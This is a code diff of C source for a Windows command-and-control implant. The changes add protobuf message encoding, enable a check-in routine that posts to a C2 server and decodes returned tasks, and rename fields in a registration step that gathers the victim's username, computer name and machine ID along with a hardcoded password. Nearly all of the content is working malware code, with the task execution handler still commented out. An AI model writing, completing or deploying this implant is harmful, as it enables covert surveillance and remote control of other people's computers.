@@ -44,6 +44,46 @@ BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
 	return registerBuffer;
 }
 
+// Function to encode the ImplantCheckin message
+BYTE *EncodeImplantCheckin(ImplantCheckin *ic, size_t *bufferSize) {
+  bool status = pb_get_encoded_size(bufferSize, ImplantCheckin_fields, ic);
+  if (!status) {
+    DEBUG_PRINTF("Failed to get ImplantCheckin size: \n");
+    return NULL;
+  }
+
+  BYTE *checkinBuffer = (BYTE *)malloc(*bufferSize);
+  pb_ostream_t stream = pb_ostream_from_buffer(checkinBuffer, *bufferSize);
+
+  status = pb_encode(&stream, ImplantCheckin_fields, ic);
+  if (!status) {
+    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
+    free(checkinBuffer);
+    return NULL;
+  }
+
+  return checkinBuffer;
+}
+
+// Decode TaskRequest message
+BOOL DecodeTaskRequest(LPBYTE result, size_t out_size, TaskRequest *tReq) {
+  pb_istream_t stream = pb_istream_from_buffer(result, out_size);
+  bool status = pb_decode(&stream, TaskRequest_fields, tReq);
+  if (!status) {
+    DEBUG_PRINTF("Decoding failed: %s\n", PB_GET_ERROR(&stream));
+    return FALSE;
+  }
+  return TRUE;
+}
+
+// Free given TaskResponse
+void FreeTaskResponse(TaskResponse *tResp) {
+  if (tResp->Response != NULL) {
+    free(tResp->Response);
+    tResp->Response = NULL;
+  }
+}
+
 int GetMachineGUID() {
 	DWORD dwSize = 0;
 
@@ -147,18 +187,18 @@ char *SetID() {
 int RegisterSelf() {
 	RegisterImplant ri = RegisterImplant_init_zero;
 
-	ri.GUID = SetID();
-	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.GUID);
+	ri.ImplantID = SetID();
+	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.ImplantID);
 
-	DWORD dwSizeUser = MAX_PATH;
-	DWORD dwSizeHostname = MAX_PATH;
+	DWORD usernameSize = MAX_PATH;
+	DWORD computerNameSize = MAX_PATH;
 	char username[MAX_PATH];
-	GetUserNameA(username, &dwSizeUser);
-	char hostname[MAX_PATH];
-	GetComputerNameA(hostname, &dwSizeHostname);
-	ri.Hostname = hostname;
+	GetUserNameA(username, &usernameSize);
+	char computerName[MAX_PATH];
+	GetComputerNameA(computerName, &computerNameSize);
+	ri.ComputerName = computerName;
 	ri.Username = username;
-	DEBUG_PRINTF("HOSTNAME = %s\n", ri.Hostname);
+	DEBUG_PRINTF("COMPUTER NAME = %s\n", ri.ComputerName);
 	DEBUG_PRINTF("USERNAME = %s\n", ri.Username);
 
 	ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";
@@ -173,47 +213,33 @@ int RegisterSelf() {
 	return 1;
 }
 
-/**
-message ImplantCheckin {
-  string GUID = 1;
-  TaskResponse Resp = 2;
-}
-**/
 // Check-in with Server
 BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
-	/**
+	
 	ImplantCheckin ic = ImplantCheckin_init_zero;
-	ic.GUID = (char *)ImplantID;
-	ic.Resp = *tResp;
-	chk.has_Resp = true;
-	size_t icBufferSize = 0;
-	BYTE *checkinBuffer = EncodeImplantCheckin(&ic, &icBufferSize);
-	
-	if (checkinBuffer == NULL) {
-		return FALSE;
-	}
-	
-	size_t out_size = 0;
-	
-	LPBYTE result = HTTPRequest(L"POST", C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA,
-                              checkinBuffer, stBuffSize, &out_size, USE_TLS);
+	ic.ImplantID = (char *)ImplantID;
+	ic.Resp = tResp;
+
+	size_t bufferSize = 0;
+	BYTE *checkinBuffer = EncodeImplantCheckin(&ic, &bufferSize);
+	LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, checkinBuffer, bufferSize);
 	
 	FreeTaskResponse(tResp);
 	free(checkinBuffer);
 	
-	if (result != NULL && out_size > 0) {
-		BOOL status = DecodeTaskRequest(result, out_size, tReq);
-		free(result);
-		if (status && tReq->TaskGuid == NULL) {
+	if (response != NULL && bufferSize > 0) {
+		BOOL status = DecodeTaskRequest(response, bufferSize, tReq);
+		free(response);
+		if (status && tReq->TaskID == NULL) {
 			// No task to perform, null out the TaskResponse
 			memset(tResp, 0, sizeof(TaskResponse));
 		}
 		return status;
 	}
 	
-	if (result) {
-		free(result);
-	}**/
+	if (response) {
+		free(response);
+	}
 	return FALSE;
 }
 
@@ -237,7 +263,7 @@ int main() {
 		
 		BOOL checkinResult = DoCheckin(&tResp, &tReq);
 		
-		if (checkinResult && tReq.TaskGuid != NULL) {
+		if (checkinResult && tReq.TaskID != NULL) {
 			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
 			// HandleOpcode(&tReq, &tResp);
 		} else {
@@ -245,7 +271,8 @@ int main() {
 			memset(&tResp, 0, sizeof(TaskResponse));
 		}
 	}
-	
+
+    // If reached here (shouldn't) best bet is going to be kill self.
 	// Free the final task response before exiting
 	// FreeTaskResponse(&tResp);
 	return 0;
